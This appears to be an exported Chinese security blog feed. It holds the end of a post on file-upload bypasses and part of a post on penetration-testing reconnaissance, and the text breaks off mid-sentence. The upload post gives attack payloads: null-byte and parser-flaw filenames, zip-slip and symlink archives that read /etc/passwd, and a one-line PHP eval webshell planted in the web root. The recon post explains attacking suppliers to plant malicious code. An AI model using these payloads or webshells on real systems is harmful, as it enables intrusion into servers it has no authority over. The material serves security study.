class="line"><span class="title function_ invoke__">exif_imagetype</span>()  图片类型</span><br></pre></td></tr></table></figure><p>上传过程</p><blockquote><p>在文件上传结束后，文件默认被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用<code>copy或</code>者<code>move_uploaded_file</code>两个函数。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">       <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><ul><li><p>中间件配置不当，导致可以解析其他脚本后缀</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line">.phpx  .phtml</span><br><span class="line">    </span><br><span class="line"><span class="comment"># jsp    </span></span><br><span class="line">.jsp .jspa .jsps .jspx </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .net</span></span><br><span class="line">.asp  .asa .cdx  .cer  .aspx .asmx  .ashx</span><br></pre></td></tr></table></figure></li><li><p>可以上传相关配置文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Apache</span></span><br><span class="line">.htaccess  .user.ini</span><br></pre></td></tr></table></figure></li></ul><p>​<a href="https://blog.csdn.net/solitudi/article/details/116666720">CTF.htaccess的使用技巧总结_.htaccess ctf_Y4tacker的博客-CSDN博客</a></p><ul><li><p>过滤不当</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">点绕过、空格绕过、后缀双写绕过、后缀大小写绕过</span><br></pre></td></tr></table></figure></li></ul><h1 id="图片白名单绕过"><a href="#图片白名单绕过" class="headerlink" title="图片白名单绕过"></a>图片白名单绕过</h1><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li>php版本&lt;5.3.4</li><li>magic_quotes_gpc关闭</li><li>保存的文件名可控</li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><p>后端使用<code>move_uploaded_file</code>来移动文件，<code>move_uploaded_file</code>函数底层为c语言，遇到0x00会截断（字符串结束标志）</p><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?save_path=../upload/shell.php%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">filename=shell.jpg</span><br></pre></td></tr></table></figure><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">    <span class="comment"># move_uploaded_file成功后才判断是否合法</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>服务端先将上传的文件写入，再判断是否合法，通过条件竞争在文件删除前访问webshell写入新的webshell即可。</p><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><ul><li><p>5.x  , 6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 文件夹解析漏洞</span><br><span class="line">会将 *.asp/目录下的所有文件当成Asp解析</span><br></pre></td></tr></table></figure></li><li><p>6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 分号截断漏洞</span><br><span class="line">默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析; 号及其后面的内容，相当于截断。</span><br></pre></td></tr></table></figure></li></ul><p>修复方案：IIS服务器本身缺陷，升级版本&#x2F;打补丁</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>产生原因：<code>FastCGI</code>与<code>PHP</code>对PATH的解析不同</p><ul><li><p>文件类型错误解析漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/example.gif/.php</span><br></pre></td></tr></table></figure><p>修复：在php.ini中<code>fix_pathinfo=0</code></p></li><li><p>空字节解析漏洞（CVE-2013-4547）</p><p>受影响版本：0.841<del>1.4.3&#x2F;1.5.0</del>1.5.7</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info.jpg%20%00.php</span><br></pre></td></tr></table></figure><p>修复：升级版本</p></li></ul><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><ul><li><p>从左到右解析漏洞</p><p>配置不当<code>AddHandler application/x-httpd-php .php</code></p><p>Apache会从左向右寻找所有可以被识别的扩展名，然后以最后一个可识别的扩展名为准进行解析。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxx.php.xyz</span><br></pre></td></tr></table></figure><p>这时候最后一个可识别的扩展为.php，会将其作为php文件进行解析，轻松绕过黑名单。</p></li><li><p>HTTPD换行解析漏洞</p><p>配置中的正则缺陷</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;[^ .]+\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>正则表达式中$不仅匹配字符串结尾位置，也可以匹配\n 或 \r，从而导致可以上传<code>.php\n</code>绕过黑名单校验，同时也可以被作为PHP文件解析。（不能是<code>.php\r\n</code>）</p></li></ul><p>修复：因为Apache的解析漏洞是由于畸形扩展名和畸形文件名导致的，所以使用白名单，并对文件重命名，文件就不会存在畸形字符和多扩展名的情况。</p><p>参考如下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]会自动把换行去掉</span></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...其他检查</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = <span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="配合文件包含"><a href="#配合文件包含" class="headerlink" title="配合文件包含"></a>配合文件包含</h3><ul><li><p>图片🐎</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  绕过宽高检查</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>用数据量小的图片，比如随便截一张很小的图</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">普通：copy,直接插入</span><br><span class="line">二次渲染：找到前后图片中没有发生变化的hex数据，替换为木马</span><br></pre></td></tr></table></figure></li><li><p>文件包含trick</p></li></ul><h3 id="配合文件读取反序列化"><a href="#配合文件读取反序列化" class="headerlink" title="配合文件读取反序列化"></a>配合文件读取反序列化</h3><p>上传任意后缀的phar格式的文件，配合文件读取用<code>phar://</code>解析</p><h1 id="压缩文件解压问题"><a href="#压缩文件解压问题" class="headerlink" title="压缩文件解压问题"></a>压缩文件解压问题</h1><p>服务端会对上传的压缩包进行解压，可以构造恶意压缩包攻击</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>Linux软链接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd test</span><br><span class="line">zip -y passwd.zip test  # -y 保证解压出来的还是软链接</span><br></pre></td></tr></table></figure><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><ul><li><p>通过构造压缩文件的文件名，造成目录穿越</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>所有已发现受<code>Zip Slip</code>影响的项目:<a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p><p><strong>注</strong>：如果用的是命令<code>unzip</code>来解压，这种方法就没用了，因为<code>unzip</code> 默认跳过文件名中的<code>../</code></p></li><li><p>软链接的妙用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个软链接指向网站目录</span></span><br><span class="line">ln -s /var/www/html test</span><br><span class="line">zip -y 1.zip test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个与软链接同名的目录，并在该目录下创建木马文件</span></span><br><span class="line">mkdir a &amp;&amp; cd a </span><br><span class="line">mkdir test</span><br><span class="line">echo &#x27;&lt;?php @eval($_GET[1]); ?&gt;&#x27; &gt; test/shell.php</span><br><span class="line">chmod 777 test/shell.php</span><br><span class="line">zip -r 2.zip test</span><br></pre></td></tr></table></figure><p>然后先上传1.zip，解压得到软链接<code>test</code>，再上传2.zip，解压得到test目录和shell.php，因为test指向&#x2F;var&#x2F;www&#x2F;html,所以shell.php实际上是被解压到网站目录下</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>From：代码审计知识星球</p><p>修改压缩包二进制字节，让压缩包解压过程出错，但是出错前已解压部分即为webshell。（出错后捕获异常，程序中止，如果开发人员没有对已解压部分进行校验，那么已解压出的webshell就可以留在服务端中）</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html</a></p><h1 id="上传后问题"><a href="#上传后问题" class="headerlink" title="上传后问题"></a>上传后问题</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件路径寻找</span><br><span class="line">没有执行权限</span><br><span class="line">内容免杀</span><br><span class="line">流量绕过</span><br></pre></td></tr></table></figure><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li><p>白名单机制</p></li><li><p>上传文件重命名</p></li><li><p>文件内容校验和过滤</p></li><li><p>避免条件竞争，先判断是否合法，而不是先将文件写入再判断是否合法</p></li><li><p>上传的文件统一放到一个地方，遵循以下原则</p><p><code>目录可写但不可解析，可解析但不可写入</code></p><p>或者上传到专门用来保存文件的地方，如存储OSS</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试流程</title>
      <link href="/2023/05/31/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/05/31/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h1><p><img src="/../images/1550719703_5c6e1ad700bb6-1685533751883.png!small" alt="图片.png"></p><p>​<a href="https://www.freebuf.com/column/196291.html">渗透测试的8个步骤 - FreeBuf网络安全行业门户</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明确目标：与客户交流，得到渗透的范围，规则和需求</span><br><span class="line">信息收集：资产收集+敏感信息收集+指纹识别</span><br><span class="line">漏洞探测和信息分析：漏洞探测与利用</span><br><span class="line">获取所需：后渗透</span><br><span class="line">信息整理和形成报告：产出报告</span><br></pre></td></tr></table></figure><h1 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h1><h2 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h2><p><strong>尽可能的扩大攻击面</strong></p><h2 id="主域名收集"><a href="#主域名收集" class="headerlink" title="主域名收集"></a>主域名收集</h2><h3 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h3><ul><li><p>是什么</p><p>ICP备案是指网站在信息产业部提交网站信息进行官方认可。</p><p>所以国内使用国内服务器的网站，都必须要先办理ICP备案后才可以上线。</p></li><li><p>有什么用</p><p>通过查询目标企业的备案信息，可直接获取到目标企业注册了哪些域名，从而增加可渗透的目标范围。</p></li><li><p>在线查询</p><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统</a></p><p><a href="https://www.gsxt.gov.cn/index.html">国家企业信用信息公示系统</a></p><p><a href="https://www.qcc.com/">企查查 </a></p><p><a href="https://www.tianyancha.com/">天眼查</a></p></li><li><p>工具</p><p><a href="https://github.com/1in9e/icp-domains">1in9e&#x2F;icp-domains: 输入一个域名，输出ICP备案所有关联域名</a></p></li></ul><h3 id="WhoIs"><a href="#WhoIs" class="headerlink" title="WhoIs"></a>WhoIs</h3><ul><li><p>是什么</p><p><code>WHOIS</code>是用来查询互联网中域名的IP以及所有者等信息的传输协议。</p></li><li><p>有什么用</p><p>通过查询目标的WHOIS信息，可以对联系人、联系邮箱等信息进行反查，可以获取更多相关的域名信息。</p></li><li><p>在线查询</p><p><a href="https://whois.chinaz.com/">域名Whois查询 - 站长之家</a></p><p><a href="http://whois.bugscaner.com/">在线域名Whois查询,网站Whois反查-在线站长工具 bugscaner</a></p><p><a href="https://who.is/">WHOIS Search, Domain Name, Website, and IP Tools - Who.is</a></p></li></ul><h3 id="股权信息"><a href="#股权信息" class="headerlink" title="股权信息"></a>股权信息</h3><ul><li><p>是什么，有什么用</p><p>通过查询股权信息，或者股权穿透图，寻找子公司和孙公司等，一般对外投资超过50%或者有行政权限的都可以算目标</p></li><li><p>查询网站</p><p><a href="https://www.qcc.com/">企查查 </a></p><p><a href="https://www.tianyancha.com/">天眼查</a></p></li></ul><h3 id="其他应用中的域名-x2F-IP"><a href="#其他应用中的域名-x2F-IP" class="headerlink" title="其他应用中的域名&#x2F;IP"></a>其他应用中的域名&#x2F;IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">微信/支付宝小程序</span><br><span class="line">微信公众号</span><br><span class="line">手机APP：抓包，历史版本</span><br></pre></td></tr></table></figure><h3 id="DNS共享记录查询"><a href="#DNS共享记录查询" class="headerlink" title="DNS共享记录查询"></a>DNS共享记录查询</h3><ul><li><p>原理</p><p>查询共享DNS服务器的主机来获取到相关的域名</p></li><li><p>步骤</p><ol><li><p>首先查询目标是否存在自建的NS服务器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>将非权威应答中的ns服务器带到下面的网站查询</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">Find all Hosts pointing to DNS Server</a></p></li></ol></li></ul><h3 id="网络空间测绘"><a href="#网络空间测绘" class="headerlink" title="网络空间测绘"></a>网络空间测绘</h3><p>多用几个网络空间搜索引擎</p><p>FoFa语法</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">title=完整  # 标题</span><br><span class="line">header=xxx # 请求头  感觉hunter的多</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cert=英文缩写   # 证书内容</span><br><span class="line">cert.subject=英文缩写 # 证书持有者</span><br><span class="line">cert.issuer=英文缩写 # 证书颁发者</span><br><span class="line"></span><br><span class="line">body=xxx  # 页面内容</span><br><span class="line"></span><br><span class="line">is_honeypot=false 排除蜜罐数据，仅限FOFA高级会员使用</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">模糊搜索 仅限个人版及以上或消耗F点使用</span></span><br><span class="line">= → *= 表示使用模糊搜索功能</span><br><span class="line">* 表示匹配的数量不受限制，可以用来代替 0 个、1 个或多个字符</span><br><span class="line">? 仅仅可替代 1 个字符</span><br><span class="line"></span><br><span class="line">https://github.com/FofaInfo/Awesome-FOFA/blob/main/Basic%20scenario/Basic%20scenario_ZH/FOFA%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF.md</span><br></pre></td></tr></table></figure><p>发现之前只用<code>domain</code>🤡，发现了学校一些之前都没看到过的网站</p><p><img src="/../images/image-20230511232351742-1685533751886.png" alt="image-20230511232351742"></p><p><img src="/../images/image-20230508172138683-1685533751887.png" alt="image-20230508172138683"></p><p><img src="/../images/image-20230508172212363-1685533751887.png" alt="image-20230508172212363"></p><p><img src="/../images/image-20230526223323629-1685533751887.png" alt="image-20230526223323629"></p><h3 id="供应链公司"><a href="#供应链公司" class="headerlink" title="供应链公司"></a>供应链公司</h3><p><a href="https://xz.aliyun.com/t/10531">记一次通过供应链拿到目标后台权限的过程 - 先知社区</a></p><ul><li><p>为什么</p><p>试想一下，目标使用供应商提供的软件，那么这些软件是受到信任的。</p><p>所以我们可以通过攻击供应商，并在软件中植入恶意代码，这样目标在运行软件时也会运行恶意代码，从而达到攻击。</p><p>并且供应商保存了目标的各种信息。</p></li><li><p>手段</p><ul><li>网站页底的备案，版权信息<img src="/../images/image-20230511130314346-1685533751887.png" alt="image-20230511130314346"></li><li>招标文件</li></ul></li></ul><h3 id="聚合工具"><a href="#聚合工具" class="headerlink" title="聚合工具"></a>聚合工具</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><blockquote><p>一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。</p></blockquote><p><img src="/../images/ENScanGo-1685533751887.png" alt="ENScanGo"></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><h3 id="枚举爆破"><a href="#枚举爆破" class="headerlink" title="枚举爆破"></a>枚举爆破</h3><ul><li><p>原理</p><p>通过不断的拼接字典中的子域名前缀去枚举域名的A记录，再对其进行验证，但是该方法一般需要解决泛解析问题。</p></li><li><p>在线网站</p><p><a href="http://z.zcjun.com/">在线子域名爆破-子成君提供</a></p></li></ul><h3 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h3><ul><li><p>是什么</p><p>证书透明性（Certificate Transparency，CT）是 Google 的公开项目，通过让域所有者、CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁。</p></li><li><p>有什么用</p><p>因为是公开的，所以任何人都可以访问到其中的CA 证书，包含了域名、子域名、邮箱等敏感信息。</p></li><li><p>在线查询</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p><a href="https://search.censys.io/">Censys Search</a></p></li></ul><h3 id="DNS公开数据集"><a href="#DNS公开数据集" class="headerlink" title="DNS公开数据集"></a>DNS公开数据集</h3><p>利用已有公开的扫描数据集，对子域名信息进行收集。</p><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p><h3 id="DNS-域传送"><a href="#DNS-域传送" class="headerlink" title="DNS 域传送"></a>DNS 域传送</h3><ul><li><p>是什么</p><p>DNS服务器分为主服务器，备份服务器，缓存服务器。</p><p><strong>域传送</strong>是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。</p></li><li><p>有什么用</p><p>若 DNS 服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者。</p></li><li><p>检测方法</p><ul><li><p>dig请求</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到NS服务器</span></span><br><span class="line">dig [domain] ns</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送axfr请求</span></span><br><span class="line">dig axfr @[ns] [domain]</span><br></pre></td></tr></table></figure></li><li><p>nmap脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain]</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><ul><li><p>传统搜索引擎</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: xxx.com -xxx (-xxx 排除哪些子域)</span><br></pre></td></tr></table></figure></li><li><p>网络空间测绘</p><p><a href="https://fofa.info/">fofa</a></p><p><a href="https://hunter.qianxin.com/">鹰图平台</a></p></li></ul><h3 id="第三方在线平台"><a href="#第三方在线平台" class="headerlink" title="第三方在线平台"></a>第三方在线平台</h3><ul><li><p><a href="https://securitytrails.com(ui好看,结果最多)/">https://securitytrails.com（UI好看，结果最多）</a></p></li><li><p><a href="https://dnsdumpster.com/">DNSdumpster.com </a></p></li><li><p><a href="https://rapiddns.io/">https://rapiddns.io/</a></p></li></ul><h3 id="聚合工具-1"><a href="#聚合工具-1" class="headerlink" title="聚合工具"></a>聚合工具</h3><h4 id="收集工具"><a href="#收集工具" class="headerlink" title="收集工具"></a>收集工具</h4><ul><li><p><code>OneForAll</code></p><blockquote><p>一条龙，需要配置api，配合代理使用效果更佳</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target domain run</span><br><span class="line">python oneforall.py --targets domain.txt run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230508203149442-1685533751888.png" alt="image-20230508203149442"></p></li><li><p><code>Amass</code></p><p>感觉速度慢</p><p>手册：<a href="https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md">https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md</a></p><p>domain可视化</p><p><img src="/../images/maltego_results-1685533751888.png" alt="Maltego results"></p></li><li><p><code>ksubdomain</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ksubdomain -d seebug.org -full -summary</span><br></pre></td></tr></table></figure></li><li><p><code>subfinder</code> </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">subfinder -silent -d hackerone.com </span><br></pre></td></tr></table></figure></li></ul><h4 id="探活工具"><a href="#探活工具" class="headerlink" title="探活工具"></a>探活工具</h4><ul><li><code>httpx</code></li></ul><p>联动</p><ul><li>subfinder 通过各种搜索引擎获取域名</li><li>ksubdomain 验证域名</li><li>httpx http请求获得数据,验证存活</li></ul><p><img src="/../images/image-20230508205053563-1685533751888.png" alt="image-20230508205053563"></p><h2 id="IP段信息收集"><a href="#IP段信息收集" class="headerlink" title="IP段信息收集"></a>IP段信息收集</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h4 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h4><h5 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h5><p>如果没有使用CDN，则只会显示一个IP地址。</p><ul><li><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a>（国内+国外）</li><li><a href="https://www.host-tracker.com/v3/check/">https://www.host-tracker.com/v3/check/</a>  （国外）</li></ul><h5 id="nslookup法"><a href="#nslookup法" class="headerlink" title="nslookup法"></a>nslookup法</h5><ul><li><p>服务器名称</p><p><img src="/../images/image-20230509225424444-1685533751888.png" alt="image-20230509225424444"></p></li><li><p>同一个域名解析对应多个 IP 地址</p><p><img src="/../images/image-20230509225313449-1685533751888.png" alt="image-20230509225313449"></p></li></ul><h5 id="观察header"><a href="#观察header" class="headerlink" title="观察header"></a>观察header</h5><ul><li>观察请求响应的返回数据的头部，是否有 CDN 服务商标识</li><li>若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN<img src="/../images/image-20210901093608312-1685533751888.png" alt="image-20210901093608312"></li></ul><h5 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h5><p><a href="https://www.cdnplanet.com/tools/cdnfinder/">https://www.cdnplanet.com/tools/cdnfinder/</a></p><h4 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h4><p>[BYPASS-CDN&#x2F;CDN 2023 完全攻击指南（一）.md at main · bin-maker&#x2F;BYPASS-CDN · GitHub](<a href="https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN">https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN</a> 2023 完全攻击指南（一）.md)</p><h5 id="CDN费用"><a href="#CDN费用" class="headerlink" title="CDN费用"></a>CDN费用</h5><p>CDN 加速需要支付一定的费用，所以<strong>子站，国外</strong>很可能没有部署CDN。</p><h5 id="历史-DNS-记录"><a href="#历史-DNS-记录" class="headerlink" title="历史 DNS 记录"></a>历史 DNS 记录</h5><p><a href="https://viewdns.info/iphistory/?domain=www.baidu.com">IP History - ViewDNS.info</a></p><p><a href="https://x.threatbook.com/v5/domain/www.baidu.com?source=top">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a></p><h5 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h5><blockquote><p>用目标邮件服务器发送邮件给自己(QQ邮箱)再查看邮件源码一定情况下可以找到真实IP（服务端和我们建立连接）</p><p>这里还有一个<code>奇淫技巧</code>，通过发送邮件给一个不存在的邮箱地址，比如 <a href="mailto:000xxx@domain.com">000xxx@domain.com</a> 